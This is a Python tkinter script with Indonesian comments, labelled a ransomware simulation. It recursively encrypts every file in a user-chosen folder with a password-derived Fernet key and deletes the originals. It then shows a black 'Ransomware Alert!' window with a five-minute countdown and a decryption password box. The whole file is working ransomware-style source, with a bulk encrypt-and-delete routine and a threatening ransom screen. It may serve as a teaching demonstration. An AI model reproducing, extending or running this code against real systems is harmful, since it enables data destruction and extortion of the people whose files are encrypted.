import os
import tkinter as tk
from tkinter import filedialog, simpledialog, messagebox
from cryptography.fernet import Fernet
import base64
import hashlib
import threading
import time

# Fungsi generate key dari password
def generate_key(password):
    return base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())

# Fungsi enkripsi file
def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(filepath + '.enc', 'wb') as f:
        f.write(encrypted)
    os.remove(filepath)

# Fungsi dekripsi file
def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    new_filepath = filepath.replace('.enc', '')
    with open(new_filepath, 'wb') as f:
        f.write(decrypted)
    os.remove(filepath)

# Simulasi jendela ancaman ransomware
def show_ransom_ui(folder, key):
    ransom = tk.Toplevel()
    ransom.title("Ransomware Alert!")
    ransom.geometry("400x300")
    ransom.config(bg='black')

    label = tk.Label(ransom, text="Semua file Anda telah dienkripsi!",
                     fg="red", bg="black", font=("Arial", 14))
    label.pack(pady=20)

    timer_label = tk.Label(ransom, text="", fg="white", bg="black", font=("Arial", 12))
    timer_label.pack(pady=10)

    def countdown():
        seconds = 300
        while seconds > 0:
            try:
                mins = seconds // 60
                secs = seconds % 60
                timer_label.config(text=f"Waktu tersisa: {mins:02}:{secs:02}")
                time.sleep(1)
                seconds -= 1
            except tk.TclError:
                break
        if timer_label.winfo_exists():
            timer_label.config(text="Waktu habis. File mungkin tidak bisa dikembalikan.")


    threading.Thread(target=countdown, daemon=True).start()

    def try_decrypt():
        password = password_entry.get()
        if not password:
            messagebox.showerror("Error", "Password tidak boleh kosong.")
            return
        key_input = generate_key(password)
        success = False
        for root, dirs, files in os.walk(folder):
            for file in files:
                if file.endswith('.enc'):
                    filepath = os.path.join(root, file)
                    try:
                        decrypt_file(filepath, key_input)
                        success = True
                    except:
                        continue
        if success:
            messagebox.showinfo("Sukses", "File berhasil didekripsi.")
            ransom.destroy()
        else:
            messagebox.showerror("Gagal", "Password salah atau file rusak.")

    tk.Label(ransom, text="Masukkan password untuk dekripsi:", fg="white", bg="black").pack(pady=10)
    password_entry = tk.Entry(ransom, show="*", width=30)
    password_entry.pack()

    tk.Button(ransom, text="DECRYPT", command=try_decrypt, bg="green", fg="white").pack(pady=20)

# UI awal untuk enkripsi
def start_encryption():
    folder = filedialog.askdirectory()
    if not folder:
        return
    password = simpledialog.askstring("Password", "Masukkan password enkripsi:", show='*')
    if not password:
        return
    key = generate_key(password)
    for root, dirs, files in os.walk(folder):
        for file in files:
            full_path = os.path.join(root, file)
            if not file.endswith('.enc'):
                encrypt_file(full_path, key)
    messagebox.showinfo("Berhasil", "Folder berhasil dienkripsi.")
    show_ransom_ui(folder, key)

# UI utama
def main_ui():
    root = tk.Tk()
    root.title("Ransomware Simulasi")
    root.geometry("300x200")
    tk.Label(root, text="Simulasi Ransomware", font=("Arial", 14)).pack(pady=10)
    tk.Button(root, text="Mulai Enkripsi Folder", command=start_encryption).pack(pady=40)
    root.mainloop()

if __name__ == "__main__":
    main_ui()
